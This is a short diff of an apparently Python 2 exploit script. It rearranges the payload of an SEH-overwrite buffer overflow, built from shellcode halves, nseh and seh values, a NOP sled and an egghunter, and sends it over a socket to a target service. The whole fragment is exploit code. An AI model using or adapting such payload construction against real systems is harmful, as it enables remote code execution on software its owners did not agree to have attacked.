@@ -129,7 +129,7 @@ shellB = shellcode[partA_len:]
 
 
 # payload = evil + nseh + seh + nops + shellcode
-payload = shellA + nseh + seh + nops + eggh
+payload = shellA + eggh + nseh + seh + nops + eggh
 socket.send(payload)
 d = socket.recv(1024)
 print d
